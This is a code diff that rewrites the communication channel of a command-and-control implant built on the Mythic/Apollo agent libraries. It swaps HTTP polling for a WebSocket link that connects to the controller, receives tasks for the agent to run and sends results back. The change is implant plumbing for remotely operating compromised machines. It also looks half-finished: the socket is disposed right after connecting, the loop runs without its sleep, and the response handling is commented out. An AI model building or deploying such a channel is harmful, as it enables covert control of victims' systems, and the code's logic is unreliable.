@@ -5,12 +5,12 @@ using System.Text;
 using ApolloInterop.Classes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
-using Fleck;
+using WebSocketSharp;
 using ApolloInterop.Types.Delegates;
 using System.Net;
 using ApolloInterop.Enums.ApolloEnums;
 
-namespace Athena
+namespace WebsocketTransport
 {
     public class WebsocketProfile : C2Profile, IC2Profile
     {
@@ -32,6 +32,7 @@ namespace Athena
         private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
         private bool _uuidNegotiated = false;
         private RSAKeyGenerator rsa = null;
+        private WebSocket webSocket;
 
         public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
@@ -95,27 +96,50 @@ namespace Athena
         public void Start()
         {
             bool first = true;
+
+            
             while (Agent.IsAlive())
             {
-                bool bRet = GetTasking(delegate (MessageResponse resp)
+                using (webSocket = new WebSocket(PostUri))
                 {
-                    return Agent.GetTaskManager().ProcessMessageResponse(resp);
-                });
 
-                if (!bRet)
-                {
-                    break;
+                    webSocket.OnOpen += (sender, e) =>
+                    {
+                        Console.WriteLine("WebSocket Opened!");
+                        webSocket.Send("Hello, WebSocket Server!");
+                    };
+
+                    webSocket.OnMessage += (sender, e) =>
+                    {
+                        Console.WriteLine($"Received Message: {e.Data}");
+                        bool bRet = GetTask(delegate (MessageResponse resp)
+                        {
+                            return Agent.GetTaskManager().ProcessMessageResponse(resp);
+                        },e.Data);
+                        if (!bRet)
+                        {
+                            webSocket.Close();
+                        }
+                    };
+
+                    webSocket.OnClose += (sender, e) =>
+                    {
+                        Console.WriteLine("WebSocket Closed!");
+                    };
+
+                    // Start the WebSocket connection
+                    webSocket.Connect();
                 }
 
-                Agent.Sleep();
+                //Agent.Sleep();
             }
         }
 
-        private bool GetTasking(OnResponse<MessageResponse> onResp)
+        private bool GetTask(OnResponse<MessageResponse> onResp, string data)
         {
             return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
             {
-                return SendRecv<TaskingMessage, MessageResponse>(msg, onResp);
+                return Recv<MessageResponse>(onResp, data);
             });
         }
 
@@ -129,9 +153,17 @@ namespace Athena
             throw new Exception("HttpProfile does not support Send only.");
         }
 
-        public bool Recv<T>(OnResponse<T> onResponse)
+        public bool Recv<TResult>(OnResponse<TResult> onResponse, string data)
         {
-            throw new Exception("HttpProfile does not support Recv only.");
+            try
+            {
+                onResponse(Serializer.Deserialize<TResult>(data));
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
         }
 
         public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
@@ -141,37 +173,11 @@ namespace Athena
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
         {
-            WebClient webClient = new WebClient();
-            if (!string.IsNullOrEmpty(ProxyHost) &&
-                !string.IsNullOrEmpty(ProxyUser) &&
-                !string.IsNullOrEmpty(ProxyPass))
-            {
-                webClient.Proxy = (IWebProxy)new WebProxy()
-                {
-                    Address = new Uri(ProxyAddress),
-                    Credentials = new NetworkCredential(ProxyUser, ProxyPass),
-                    UseDefaultCredentials = false,
-                    BypassProxyOnLocal = false
-                };
-            }
-            else
-            {
-                // Use Default Proxy and Cached Credentials for Internet Access
-                webClient.Proxy = WebRequest.GetSystemWebProxy();
-                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-            }
-
-            foreach (string k in _additionalHeaders.Keys)
-            {
-                webClient.Headers.Add(k, _additionalHeaders[k]);
-            }
-
-            webClient.BaseAddress = Endpoint;
             string sMsg = Serializer.Serialize(message);
             try
             {
-                var response = webClient.UploadString(PostUri, sMsg);
-                onResponse(Serializer.Deserialize<TResult>(response));
+                webSocket.Send(sMsg);
+                //onResponse(Serializer.Deserialize<TResult>(response));
                 return true;
             }
             catch (Exception ex)
